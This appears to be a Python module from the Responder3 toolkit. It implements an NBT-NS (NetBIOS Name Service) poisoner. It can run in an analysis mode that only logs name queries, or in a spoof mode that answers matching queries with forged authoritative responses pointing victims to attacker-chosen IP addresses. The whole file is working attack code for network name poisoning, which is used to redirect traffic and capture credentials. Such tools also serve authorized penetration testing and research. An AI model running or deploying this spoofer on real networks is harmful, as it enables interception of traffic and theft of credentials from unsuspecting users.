import socket
import struct
import logging
import asyncio
import ipaddress
import traceback

from responder3.core.commons import *
from responder3.protocols.NetBIOS import * 
from responder3.core.servertemplate import ResponderServer, ResponderServerSession


class NBTNSSession(ResponderServerSession):
	pass

class NBTNS(ResponderServer):
	def init(self):
		self.parser = NBTNSPacket
		self.spoofTable = []
		if self.settings is None:
			self.log(logging.INFO, 'No settings defined, adjusting to Analysis functionality!')
			self.settings = {}
			self.settings['mode'] = PoisonerMode.ANALYSE

		else:
			#parse the poisoner mode
			if isinstance(self.settings['mode'], str):
				self.settings['mode'] = PoisonerMode[self.settings['mode'].upper()]

			#compiling re strings to actual re objects and converting IP strings to IP objects
			if self.settings['mode'] == PoisonerMode.SPOOF:
				for exp in self.settings['spooftable']:
					self.spoofTable.append((re.compile(exp),ipaddress.ip_address(self.settings['spooftable'][exp])))

	@asyncio.coroutine
	def parse_message(self):
		msg = yield from asyncio.wait_for(self.parser.from_streamreader(self.creader), timeout=1)
		return msg

	@asyncio.coroutine
	def send_data(self, data):
		yield from asyncio.wait_for(self.cwriter.write(data), timeout=1)
		return

	@asyncio.coroutine
	def run(self):
		try:
			msg = yield from asyncio.wait_for(self.parse_message(), timeout=1)
			if self.settings['mode'] == PoisonerMode.ANALYSE:
				for q in msg.Questions:
					self.logPoisonResult(requestName = q.QNAME)

			else: #poisoning
				answers = []
				for targetRE, ip in self.spoofTable:
					for q in msg.Questions:
						if targetRE.match(q.QNAME):
							self.logPoisonResult(requestName = q.QNAME, poisonName = str(targetRE), poisonIP = ip)
							res = NBResource()
							res.construct(q.QNAME, NBRType.NB, ip)
							answers.append(res)
				
				response = NBTNSPacket()
				response.construct(TID = msg.NAME_TRN_ID, 
					 response = NBTSResponse.RESPONSE, 
					 opcode = NBTNSOpcode.QUERY, 
					 nmflags = NBTSNMFlags.AUTHORATIVEANSWER | NBTSNMFlags.RECURSIONDESIRED, 
					 answers= answers)

				yield from asyncio.wait_for(self.send_data(response.toBytes()), timeout=1)

		except Exception as e:
			traceback.print_exc()
			self.log('Exception! %s' % (str(e),))
			pass
